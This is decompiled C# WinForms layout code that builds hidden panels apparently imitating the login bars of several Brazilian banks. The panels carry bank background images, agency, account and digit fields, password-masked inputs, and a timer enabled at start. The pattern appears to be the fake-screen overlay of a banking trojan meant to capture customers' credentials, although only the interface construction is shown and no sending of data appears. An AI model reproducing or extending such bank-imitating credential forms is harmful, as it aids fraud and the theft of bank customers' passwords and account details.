		//IL_1f52: Expected O, but got Unknown
		//IL_1ffc: Unknown result type (might be due to invalid IL or missing references)
		//IL_2006: Expected O, but got Unknown
		//IL_208c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2096: Expected O, but got Unknown
		//IL_20c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_20cf: Expected O, but got Unknown
		//IL_2144: Unknown result type (might be due to invalid IL or missing references)
		//IL_214e: Expected O, but got Unknown
		//IL_2194: Unknown result type (might be due to invalid IL or missing references)
		//IL_219e: Expected O, but got Unknown
		//IL_2224: Unknown result type (might be due to invalid IL or missing references)
		//IL_222e: Expected O, but got Unknown
		//IL_22f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_22fa: Expected O, but got Unknown
		//IL_2386: Unknown result type (might be due to invalid IL or missing references)
		//IL_2390: Expected O, but got Unknown
		//IL_241e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2428: Expected O, but got Unknown
		//IL_2514: Unknown result type (might be due to invalid IL or missing references)
		//IL_251e: Expected O, but got Unknown
		//IL_26aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_26b4: Expected O, but got Unknown
		//IL_2721: Unknown result type (might be due to invalid IL or missing references)
		//IL_272b: Expected O, but got Unknown
		//IL_2758: Unknown result type (might be due to invalid IL or missing references)
		//IL_2762: Expected O, but got Unknown
		//IL_27e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_27f2: Expected O, but got Unknown
		//IL_2875: Unknown result type (might be due to invalid IL or missing references)
		//IL_287f: Expected O, but got Unknown
		//IL_2981: Unknown result type (might be due to invalid IL or missing references)
		//IL_298b: Expected O, but got Unknown
		//IL_29b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c5d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c67: Expected O, but got Unknown
		//IL_2cd8: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ce2: Expected O, but got Unknown
		//IL_435e: Unknown result type (might be due to invalid IL or missing references)
		//IL_4368: Expected O, but got Unknown
		//IL_4386: Unknown result type (might be due to invalid IL or missing references)
		//IL_4390: Expected O, but got Unknown
		//IL_43ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_43f4: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		timer1 = new Timer(components);
		bd_ag = new TextBox();
		bd_nc = new TextBox();
		bd_dg = new TextBox();
		bd_ok = new LinkLabel();
		inicia_bra = new Panel();
		snt_ag = new TextBox();
		snt_cc1 = new TextBox();
		snt_cc2 = new TextBox();
		linkLabel2 = new LinkLabel();
		snt_cc = new TextBox();
		snt_ok = new LinkLabel();
		inicia_san = new Panel();
		r1 = new RadioButton();
		r2 = new RadioButton();
		r3 = new RadioButton();
		NOUS = new TextBox();
		label8 = new Label();
		label1 = new Label();
		Tipo = new Label();
		inicia_cx = new Panel();
		comboBox1 = new ComboBox();
		inicia_prs = new Panel();
		botao_okprs = new Label();
		prs_c = new TextBox();
		prs_b = new TextBox();
		prs_a = new TextBox();
		inicia_prm = new Panel();
		prm_ok = new LinkLabel();
		prm_c = new TextBox();
		prm_b = new TextBox();
		prm_a = new TextBox();
		inicia_ita = new Panel();
		it_ok = new LinkLabel();
		ita_c = new TextBox();
		ita_b = new TextBox();
		ita_a = new TextBox();
		inicia_cc = new Panel();
		finaliza_cc = new Panel();
		campo_fi = new Label();
		campo_di = new TextBox();
		campo_da = new TextBox();
		campo_se = new TextBox();
		label2 = new Label();
		campo_usu = new TextBox();
		campo_sen = new TextBox();
		inicia_citi = new Panel();
		finaliza_citi = new Panel();
		finaliza_citi1 = new Panel();
		ct_ca = new TextBox();
		pictureBox1 = new PictureBox();
		label5 = new Label();
		label4 = new Label();
		label6 = new Label();
		checkBox1 = new CheckBox();
		ct_es = new TextBox();
		ct_em = new TextBox();
		click1 = new Label();
		lembrar = new CheckBox();
		ct_u2 = new TextBox();
		ct_u1 = new TextBox();
		cititec = new Panel();
		label38 = new Label();
		label41 = new Label();
		label43 = new Label();
		label40 = new Label();
		label42 = new Label();
		label30 = new Label();
		label39 = new Label();
		label22 = new Label();
		label14 = new Label();
		label37 = new Label();
		label29 = new Label();
		label21 = new Label();
		label9 = new Label();
		label36 = new Label();
		label28 = new Label();
		label20 = new Label();
		label13 = new Label();
		label35 = new Label();
		label27 = new Label();
		label19 = new Label();
		label10 = new Label();
		label34 = new Label();
		label26 = new Label();
		label18 = new Label();
		label12 = new Label();
		label33 = new Label();
		label25 = new Label();
		label17 = new Label();
		label7 = new Label();
		label32 = new Label();
		label24 = new Label();
		label16 = new Label();
		label11 = new Label();
		label31 = new Label();
		label23 = new Label();
		label15 = new Label();
		label44 = new Label();
		((Control)inicia_bra).SuspendLayout();
		((Control)inicia_san).SuspendLayout();
		((Control)inicia_cx).SuspendLayout();
		((Control)inicia_prs).SuspendLayout();
		((Control)inicia_prm).SuspendLayout();
		((Control)inicia_ita).SuspendLayout();
		((Control)inicia_cc).SuspendLayout();
		((Control)finaliza_cc).SuspendLayout();
		((Control)inicia_citi).SuspendLayout();
		((Control)finaliza_citi).SuspendLayout();
		((Control)finaliza_citi1).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)cititec).SuspendLayout();
		((Control)this).SuspendLayout();
		timer1.set_Enabled(true);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)bd_ag).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)bd_ag).set_Location(new Point(379, 4));
		((TextBoxBase)bd_ag).set_MaxLength(4);
		((Control)bd_ag).set_Name("bd_ag");
		((Control)bd_ag).set_Size(new Size(35, 18));
		((Control)bd_ag).set_TabIndex(5);
		((Control)bd_ag).add_Enter((EventHandler)bd_ag_Enter);
		((Control)bd_ag).add_Leave((EventHandler)bd_ag_Leave);
		((Control)bd_ag).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)bd_ag).add_TextChanged((EventHandler)bd_ag_TextChanged);
		((Control)bd_nc).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)bd_nc).set_Location(new Point(460, 4));
		((TextBoxBase)bd_nc).set_MaxLength(7);
		((Control)bd_nc).set_Name("bd_nc");
		((Control)bd_nc).set_Size(new Size(57, 18));
		((Control)bd_nc).set_TabIndex(6);
		((Control)bd_nc).add_Enter((EventHandler)bd_nc_Enter);
		((Control)bd_nc).add_Leave((EventHandler)bd_nc_Leave);
		((Control)bd_nc).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)bd_nc).add_TextChanged((EventHandler)bd_nc_TextChanged);
		((Control)bd_dg).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)bd_dg).set_Location(new Point(517, 4));
		((TextBoxBase)bd_dg).set_MaxLength(1);
		((Control)bd_dg).set_Name("bd_dg");
		((Control)bd_dg).set_Size(new Size(13, 18));
		((Control)bd_dg).set_TabIndex(7);
		((Control)bd_dg).add_Enter((EventHandler)bd_dg_Enter);
		((Control)bd_dg).add_Leave((EventHandler)bd_dg_Leave);
		((Control)bd_dg).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)bd_ok).set_BackColor(Color.Transparent);
		((Control)bd_ok).set_Cursor(Cursors.get_Hand());
		((Control)bd_ok).set_Location(new Point(537, 5));
		((Control)bd_ok).set_Name("bd_ok");
		((Control)bd_ok).set_Size(new Size(19, 16));
		((Control)bd_ok).set_TabIndex(8);
		((Control)bd_ok).add_Click((EventHandler)botao1_Click);
		((Control)inicia_bra).set_BackColor(Color.White);
		((Control)inicia_bra).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_bra.BackgroundImage"));
		((Control)inicia_bra).set_BackgroundImageLayout((ImageLayout)0);
		((Control)inicia_bra).set_CausesValidation(false);
		((Control)inicia_bra).get_Controls().Add((Control)(object)bd_ok);
		((Control)inicia_bra).get_Controls().Add((Control)(object)bd_dg);
		((Control)inicia_bra).get_Controls().Add((Control)(object)bd_nc);
		((Control)inicia_bra).get_Controls().Add((Control)(object)bd_ag);
		((Control)inicia_bra).set_Location(new Point(4, 1));
		((Control)inicia_bra).set_Name("inicia_bra");
		((Control)inicia_bra).set_Size(new Size(562, 25));
		((Control)inicia_bra).set_TabIndex(16);
		((Control)inicia_bra).set_Visible(false);
		((TextBoxBase)snt_ag).set_BorderStyle((BorderStyle)0);
		((Control)snt_ag).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)snt_ag).set_Location(new Point(52, 15));
		((TextBoxBase)snt_ag).set_MaxLength(4);
		((Control)snt_ag).set_Name("snt_ag");
		((Control)snt_ag).set_Size(new Size(31, 11));
		((Control)snt_ag).set_TabIndex(0);
		((Control)snt_ag).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)snt_ag).add_TextChanged((EventHandler)snt_ag_TextChanged);
		((TextBoxBase)snt_cc1).set_BorderStyle((BorderStyle)0);
		((Control)snt_cc1).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)snt_cc1).set_Location(new Point(147, 15));
		((TextBoxBase)snt_cc1).set_MaxLength(6);
		((Control)snt_cc1).set_Name("snt_cc1");
		((Control)snt_cc1).set_Size(new Size(45, 11));
		((Control)snt_cc1).set_TabIndex(2);
		((Control)snt_cc1).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)snt_cc1).add_TextChanged((EventHandler)snt_cc1_TextChanged);
		((TextBoxBase)snt_cc2).set_BorderStyle((BorderStyle)0);
		((Control)snt_cc2).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)snt_cc2).set_Location(new Point(199, 15));
		((TextBoxBase)snt_cc2).set_MaxLength(1);
		((Control)snt_cc2).set_Name("snt_cc2");
		((Control)snt_cc2).set_Size(new Size(9, 11));
		((Control)snt_cc2).set_TabIndex(3);
		((Control)snt_cc2).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)linkLabel2).set_BackColor(Color.Transparent);
		((Control)linkLabel2).set_Cursor(Cursors.get_Hand());
		((Control)linkLabel2).set_Location(new Point(241, 10));
		((Control)linkLabel2).set_Name("linkLabel2");
		((Control)linkLabel2).set_Size(new Size(18, 14));
		((Control)linkLabel2).set_TabIndex(7);
		((TextBoxBase)snt_cc).set_BorderStyle((BorderStyle)0);
		((Control)snt_cc).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)snt_cc).set_Location(new Point(125, 15));
		((TextBoxBase)snt_cc).set_MaxLength(2);
		((Control)snt_cc).set_Name("snt_cc");
		((Control)snt_cc).set_Size(new Size(16, 11));
		((Control)snt_cc).set_TabIndex(1);
		((Control)snt_cc).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)snt_cc).add_TextChanged((EventHandler)snt_cc_TextChanged);
		((Control)snt_ok).set_BackColor(Color.Transparent);
		((Control)snt_ok).set_Cursor(Cursors.get_Hand());
		((Control)snt_ok).set_Location(new Point(214, 14));
		((Control)snt_ok).set_Name("snt_ok");
		((Control)snt_ok).set_Size(new Size(15, 13));
		((Control)snt_ok).set_TabIndex(9);
		((Control)snt_ok).add_Click((EventHandler)snt_ok_Click);
		((Control)inicia_san).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_san.BackgroundImage"));
		((Control)inicia_san).get_Controls().Add((Control)(object)snt_ok);
		((Control)inicia_san).get_Controls().Add((Control)(object)snt_cc);
		((Control)inicia_san).get_Controls().Add((Control)(object)linkLabel2);
		((Control)inicia_san).get_Controls().Add((Control)(object)snt_cc2);
		((Control)inicia_san).get_Controls().Add((Control)(object)snt_cc1);
		((Control)inicia_san).get_Controls().Add((Control)(object)snt_ag);
		((Control)inicia_san).set_Location(new Point(451, 19));
		((Control)inicia_san).set_Margin(new Padding(0));
		((Control)inicia_san).set_Name("inicia_san");
		((Control)inicia_san).set_Size(new Size(253, 43));
		((Control)inicia_san).set_TabIndex(18);
		((Control)inicia_san).set_Visible(false);
		((Control)r1).set_AutoSize(true);
		((Control)r1).set_BackColor(Color.Transparent);
		((Control)r1).set_Location(new Point(257, 196));
		((Control)r1).set_Name("r1");
		((Control)r1).set_Size(new Size(14, 13));
		((Control)r1).set_TabIndex(1);
		r1.set_TabStop(true);
		((ButtonBase)r1).set_UseVisualStyleBackColor(false);
		r1.add_CheckedChanged((EventHandler)r1_CheckedChanged);
		((Control)r2).set_AutoSize(true);
		((Control)r2).set_BackColor(Color.Transparent);
		((Control)r2).set_Location(new Point(257, 222));
		((Control)r2).set_Name("r2");
		((Control)r2).set_Size(new Size(14, 13));
		((Control)r2).set_TabIndex(2);
		r2.set_TabStop(true);
		((ButtonBase)r2).set_UseVisualStyleBackColor(false);
		r2.add_CheckedChanged((EventHandler)r2_CheckedChanged);
		((Control)r3).set_AutoSize(true);
		((Control)r3).set_BackColor(Color.Transparent);
		((Control)r3).set_Location(new Point(257, 248));
		((Control)r3).set_Name("r3");
		((Control)r3).set_Size(new Size(14, 13));
		((Control)r3).set_TabIndex(3);
		r3.set_TabStop(true);
		((ButtonBase)r3).set_UseVisualStyleBackColor(false);
		r3.add_CheckedChanged((EventHandler)r3_CheckedChanged);
		((Control)NOUS).set_BackColor(Color.WhiteSmoke);
		NOUS.set_CharacterCasing((CharacterCasing)1);
		((Control)NOUS).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)NOUS).set_Location(new Point(250, 161));
		((Control)NOUS).set_Name("NOUS");
		((Control)NOUS).set_Size(new Size(150, 18));
		((Control)NOUS).set_TabIndex(0);
		((Control)label8).set_BackColor(Color.Transparent);
		((Control)label8).set_Cursor(Cursors.get_Hand());
		((Control)label8).set_Location(new Point(375, 278));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(74, 15));
		((Control)label8).set_TabIndex(10);
		((Control)label8).set_Tag((object)"");
		((Control)label8).add_Click((EventHandler)label8_Click);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Cursor(Cursors.get_Hand());
		((Control)label1).set_Location(new Point(130, 374));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(117, 17));
		((Control)label1).set_TabIndex(11);
		((Control)label1).set_Tag((object)"");
		((Control)Tipo).set_BackColor(Color.White);
		((Control)Tipo).set_Location(new Point(127, 196));
		((Control)Tipo).set_Name("Tipo");
		((Control)Tipo).set_Size(new Size(98, 13));
		((Control)Tipo).set_TabIndex(12);
		((Control)Tipo).set_Visible(false);
		((Control)inicia_cx).set_BackColor(Color.FromArgb(0, 40, 132));
		((Control)inicia_cx).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_cx.BackgroundImage"));
		((Control)inicia_cx).set_BackgroundImageLayout((ImageLayout)0);
		((Control)inicia_cx).get_Controls().Add((Control)(object)comboBox1);
		((Control)inicia_cx).get_Controls().Add((Control)(object)Tipo);
		((Control)inicia_cx).get_Controls().Add((Control)(object)label1);
		((Control)inicia_cx).get_Controls().Add((Control)(object)label8);
		((Control)inicia_cx).get_Controls().Add((Control)(object)NOUS);
		((Control)inicia_cx).get_Controls().Add((Control)(object)r3);
		((Control)inicia_cx).get_Controls().Add((Control)(object)r2);
		((Control)inicia_cx).get_Controls().Add((Control)(object)r1);
		((Control)inicia_cx).set_Location(new Point(1, 0));
		((Control)inicia_cx).set_Name("inicia_cx");
		((Control)inicia_cx).set_Size(new Size(27, 22));
		((Control)inicia_cx).set_TabIndex(19);
		((Control)inicia_cx).set_Visible(false);
		((Control)comboBox1).set_BackColor(Color.WhiteSmoke);
		((Control)comboBox1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)comboBox1).set_ForeColor(Color.Gray);
		((ListControl)comboBox1).set_FormattingEnabled(true);
		comboBox1.get_Items().AddRange(new object[3] { "Saldo", "Extrato", "Investimentos" });
		((Control)comboBox1).set_Location(new Point(250, 276));
		((Control)comboBox1).set_Margin(new Padding(0));
		((Control)comboBox1).set_Name("comboBox1");
		((Control)comboBox1).set_Size(new Size(108, 21));
		((Control)comboBox1).set_TabIndex(13);
		((Control)comboBox1).set_Text("Página Inicial");
		((Control)inicia_prs).set_BackColor(Color.WhiteSmoke);
		((Control)inicia_prs).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_prs.BackgroundImage"));
		((Control)inicia_prs).get_Controls().Add((Control)(object)botao_okprs);
		((Control)inicia_prs).get_Controls().Add((Control)(object)prs_c);
		((Control)inicia_prs).get_Controls().Add((Control)(object)prs_b);
		((Control)inicia_prs).get_Controls().Add((Control)(object)prs_a);
		((Control)inicia_prs).set_Location(new Point(468, 1));
		((Control)inicia_prs).set_Name("inicia_prs");
		((Control)inicia_prs).set_Size(new Size(312, 53));
		((Control)inicia_prs).set_TabIndex(23);
		((Control)inicia_prs).set_Visible(false);
		((Control)botao_okprs).set_BackColor(Color.Transparent);
		((Control)botao_okprs).set_Cursor(Cursors.get_Hand());
		((Control)botao_okprs).set_Location(new Point(270, 28));
		((Control)botao_okprs).set_Name("botao_okprs");
		((Control)botao_okprs).set_Size(new Size(18, 15));
		((Control)botao_okprs).set_TabIndex(3);
		((Control)botao_okprs).add_Click((EventHandler)botao_okprs_Click);
		((TextBoxBase)prs_c).set_BorderStyle((BorderStyle)0);
		((Control)prs_c).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)prs_c).set_Location(new Point(241, 29));
		((Control)prs_c).set_Margin(new Padding(2));
		((TextBoxBase)prs_c).set_MaxLength(1);
		((Control)prs_c).set_Name("prs_c");
		((Control)prs_c).set_Size(new Size(20, 14));
		((Control)prs_c).set_TabIndex(2);
		prs_c.set_TextAlign((HorizontalAlignment)2);
		((TextBoxBase)prs_b).set_BorderStyle((BorderStyle)0);
		((Control)prs_b).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)prs_b).set_Location(new Point(180, 29));
		((Control)prs_b).set_Margin(new Padding(2));
		((TextBoxBase)prs_b).set_MaxLength(5);
		((Control)prs_b).set_Name("prs_b");
		((Control)prs_b).set_Size(new Size(53, 14));
		((Control)prs_b).set_TabIndex(1);
		prs_b.set_TextAlign((HorizontalAlignment)2);
		((Control)prs_b).add_TextChanged((EventHandler)prs_b_TextChanged);
		((TextBoxBase)prs_a).set_BorderStyle((BorderStyle)0);
		((Control)prs_a).set_Cursor(Cursors.get_IBeam());
		((Control)prs_a).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)prs_a).set_Location(new Point(58, 29));
		((Control)prs_a).set_Margin(new Padding(2));
		((TextBoxBase)prs_a).set_MaxLength(4);
		((Control)prs_a).set_Name("prs_a");
		((Control)prs_a).set_Size(new Size(51, 14));
		((Control)prs_a).set_TabIndex(0);
		prs_a.set_TextAlign((HorizontalAlignment)2);
		((Control)prs_a).add_TextChanged((EventHandler)prs_a_TextChanged);
		((Control)inicia_prm).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_prm.BackgroundImage"));
		((Control)inicia_prm).set_BackgroundImageLayout((ImageLayout)0);
		((Control)inicia_prm).set_CausesValidation(false);
		((Control)inicia_prm).get_Controls().Add((Control)(object)prm_ok);
		((Control)inicia_prm).get_Controls().Add((Control)(object)prm_c);
		((Control)inicia_prm).get_Controls().Add((Control)(object)prm_b);
		((Control)inicia_prm).get_Controls().Add((Control)(object)prm_a);
		((Control)inicia_prm).set_Location(new Point(0, 0));
		((Control)inicia_prm).set_Name("inicia_prm");
		((Control)inicia_prm).set_Size(new Size(588, 27));
		((Control)inicia_prm).set_TabIndex(21);
		((Control)inicia_prm).set_Visible(false);
		((Control)prm_ok).set_BackColor(Color.Transparent);
		((Control)prm_ok).set_Cursor(Cursors.get_Hand());
		((Control)prm_ok).set_Location(new Point(567, 7));
		((Control)prm_ok).set_Name("prm_ok");
		((Control)prm_ok).set_Size(new Size(15, 16));
		((Control)prm_ok).set_TabIndex(8);
		((Control)prm_ok).add_Click((EventHandler)prm_ok_Click);
		((Control)prm_c).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)prm_c).set_Location(new Point(539, 7));
		((TextBoxBase)prm_c).set_MaxLength(1);
		((Control)prm_c).set_Name("prm_c");
		((Control)prm_c).set_Size(new Size(15, 18));
		((Control)prm_c).set_TabIndex(7);
		((Control)prm_c).add_Enter((EventHandler)prm_c_Enter);
		((Control)prm_c).add_Leave((EventHandler)prm_c_Leave);
		((Control)prm_c).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)prm_b).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)prm_b).set_Location(new Point(469, 7));
		((TextBoxBase)prm_b).set_MaxLength(7);
		((Control)prm_b).set_Name("prm_b");
		((Control)prm_b).set_Size(new Size(64, 18));
		((Control)prm_b).set_TabIndex(6);
		((Control)prm_b).add_Enter((EventHandler)prm_b_Enter);
		((Control)prm_b).add_Leave((EventHandler)prm_b_Leave);
		((Control)prm_b).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)prm_b).add_TextChanged((EventHandler)prm_b_TextChanged);
		((Control)prm_a).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)prm_a).set_Location(new Point(379, 7));
		((TextBoxBase)prm_a).set_MaxLength(4);
		((Control)prm_a).set_Name("prm_a");
		((Control)prm_a).set_Size(new Size(36, 18));
		((Control)prm_a).set_TabIndex(5);
		((Control)prm_a).add_Enter((EventHandler)prm_a_Enter);
		((Control)prm_a).add_Leave((EventHandler)prm_a_Leave);
		((Control)prm_a).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)prm_a).add_TextChanged((EventHandler)prm_a_TextChanged);
		((Control)inicia_ita).set_BackColor(Color.White);
		((Control)inicia_ita).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_ita.BackgroundImage"));
		((Control)inicia_ita).set_BackgroundImageLayout((ImageLayout)0);
		((Control)inicia_ita).get_Controls().Add((Control)(object)it_ok);
		((Control)inicia_ita).get_Controls().Add((Control)(object)ita_c);
		((Control)inicia_ita).get_Controls().Add((Control)(object)ita_b);
		((Control)inicia_ita).get_Controls().Add((Control)(object)ita_a);
		((Control)inicia_ita).set_Location(new Point(282, 18));
		((Control)inicia_ita).set_Margin(new Padding(0));
		((Control)inicia_ita).set_Name("inicia_ita");
		((Control)inicia_ita).set_Size(new Size(266, 31));
		((Control)inicia_ita).set_TabIndex(15);
		((Control)inicia_ita).set_Visible(false);
		((Control)it_ok).set_BackColor(Color.Transparent);
		((Control)it_ok).set_Cursor(Cursors.get_Hand());
		((Control)it_ok).set_Location(new Point(241, 10));
		((Control)it_ok).set_Name("it_ok");
		((Control)it_ok).set_Size(new Size(18, 14));
		((Control)it_ok).set_TabIndex(7);
		((Control)it_ok).add_Click((EventHandler)linkLabel1_Click);
		((TextBoxBase)ita_c).set_BorderStyle((BorderStyle)0);
		((Control)ita_c).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ita_c).set_Location(new Point(212, 11));
		((TextBoxBase)ita_c).set_MaxLength(1);
		((Control)ita_c).set_Name("ita_c");
		((Control)ita_c).set_Size(new Size(17, 11));
		((Control)ita_c).set_TabIndex(6);
		((Control)ita_c).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((TextBoxBase)ita_b).set_BorderStyle((BorderStyle)0);
		((Control)ita_b).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ita_b).set_Location(new Point(150, 11));
		((TextBoxBase)ita_b).set_MaxLength(5);
		((Control)ita_b).set_Name("ita_b");
		((Control)ita_b).set_Size(new Size(55, 11));
		((Control)ita_b).set_TabIndex(5);
		((Control)ita_b).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)ita_b).add_TextChanged((EventHandler)ita_b_TextChanged);
		((TextBoxBase)ita_a).set_BorderStyle((BorderStyle)0);
		((Control)ita_a).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ita_a).set_Location(new Point(59, 11));
		((TextBoxBase)ita_a).set_MaxLength(4);
		((Control)ita_a).set_Name("ita_a");
		((Control)ita_a).set_Size(new Size(43, 11));
		((Control)ita_a).set_TabIndex(4);
		((Control)ita_a).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)ita_a).add_TextChanged((EventHandler)ita_a_TextChanged);
		((Control)inicia_cc).set_BackColor(Color.White);
		((Control)inicia_cc).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_cc.BackgroundImage"));
		((Control)inicia_cc).set_BackgroundImageLayout((ImageLayout)0);
		((Control)inicia_cc).get_Controls().Add((Control)(object)finaliza_cc);
		((Control)inicia_cc).get_Controls().Add((Control)(object)label2);
		((Control)inicia_cc).get_Controls().Add((Control)(object)campo_usu);
		((Control)inicia_cc).get_Controls().Add((Control)(object)campo_sen);
		((Control)inicia_cc).set_Location(new Point(99, 99));
		((Control)inicia_cc).set_Name("inicia_cc");
		((Control)inicia_cc).set_Size(new Size(401, 140));
		((Control)inicia_cc).set_TabIndex(0);
		((Control)inicia_cc).set_Visible(false);
		((Control)finaliza_cc).set_BackColor(Color.White);
		((Control)finaliza_cc).set_BackgroundImage((Image)componentResourceManager.GetObject("finaliza_cc.BackgroundImage"));
		((Control)finaliza_cc).set_BackgroundImageLayout((ImageLayout)0);
		((Control)finaliza_cc).get_Controls().Add((Control)(object)campo_fi);
		((Control)finaliza_cc).get_Controls().Add((Control)(object)campo_di);
		((Control)finaliza_cc).get_Controls().Add((Control)(object)campo_da);
		((Control)finaliza_cc).get_Controls().Add((Control)(object)campo_se);
		((Control)finaliza_cc).set_Location(new Point(4, 4));
		((Control)finaliza_cc).set_Name("finaliza_cc");
		((Control)finaliza_cc).set_Size(new Size(398, 136));
		((Control)finaliza_cc).set_TabIndex(25);
		((Control)finaliza_cc).set_Visible(false);
		((Control)finaliza_cc).add_Paint(new PaintEventHandler(finaliza_cc_Paint));
		((Control)campo_fi).set_BackColor(Color.Transparent);
		((Control)campo_fi).set_Cursor(Cursors.get_Hand());
		((Control)campo_fi).set_Location(new Point(119, 115));
		((Control)campo_fi).set_Name("campo_fi");
		((Control)campo_fi).set_Size(new Size(66, 10));
		((Control)campo_fi).set_TabIndex(2);
		((Control)campo_fi).add_Click((EventHandler)campo_fi_Click);
		((Control)campo_di).set_BackColor(Color.White);
		((TextBoxBase)campo_di).set_BorderStyle((BorderStyle)0);
		((Control)campo_di).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)campo_di).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)campo_di).set_Location(new Point(130, 63));
		((TextBoxBase)campo_di).set_MaxLength(3);
		((Control)campo_di).set_Name("campo_di");
		campo_di.set_PasswordChar('•');
		((Control)campo_di).set_Size(new Size(34, 14));
		((Control)campo_di).set_TabIndex(2);
		((Control)campo_di).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)campo_da).set_BackColor(Color.White);
		((TextBoxBase)campo_da).set_BorderStyle((BorderStyle)0);
		((Control)campo_da).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)campo_da).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)campo_da).set_Location(new Point(130, 8));
		((TextBoxBase)campo_da).set_MaxLength(8);
		((Control)campo_da).set_Name("campo_da");
		((Control)campo_da).set_Size(new Size(67, 14));
		((Control)campo_da).set_TabIndex(0);
		((Control)campo_da).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)campo_da).add_TextChanged((EventHandler)campo_da_TextChanged);
		((Control)campo_se).set_BackColor(Color.White);
		((TextBoxBase)campo_se).set_BorderStyle((BorderStyle)0);
		((Control)campo_se).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)campo_se).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)campo_se).set_Location(new Point(130, 35));
		((TextBoxBase)campo_se).set_MaxLength(6);
		((Control)campo_se).set_Name("campo_se");
		campo_se.set_PasswordChar('•');
		((Control)campo_se).set_Size(new Size(54, 14));
		((Control)campo_se).set_TabIndex(1);
		((Control)campo_se).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)campo_se).add_TextChanged((EventHandler)campo_se_TextChanged);
		((Control)label2).set_BackColor(Color.Transparent);
		((Control)label2).set_Cursor(Cursors.get_Hand());
		((Control)label2).set_Location(new Point(127, 122));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(60, 11));
		((Control)label2).set_TabIndex(26);
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)campo_usu).set_BackColor(Color.White);
		((TextBoxBase)campo_usu).set_BorderStyle((BorderStyle)0);
		((Control)campo_usu).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)campo_usu).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)campo_usu).set_Location(new Point(138, 79));
		((Control)campo_usu).set_Name("campo_usu");
		((Control)campo_usu).set_Size(new Size(76, 14));
